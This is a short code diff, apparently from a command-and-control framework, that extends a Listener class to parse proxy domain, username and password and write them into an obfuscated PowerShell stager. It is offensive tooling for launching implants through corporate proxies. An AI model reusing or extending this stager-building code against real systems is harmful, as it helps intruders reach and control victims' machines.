@@ -200,8 +200,13 @@ class Listener:
                         if proxyCreds.lower() == "default":
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
-                            # TODO: implement form for other proxy credentials
-                            pass
+                            domain = proxyCreds.split("\\")[0]
+                            creds = proxyCreds.split("\\")[1:]
+                            username = "".join(creds).split(":")[0]
+                            password = "".join("".join(creds).split(":")[1:])
+
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.NetworkCredential]::new")
+                            stager += "('%s', '%s', '%s');" % (username, password, domain)
 
                 # TODO: reimplement stager retries?
 
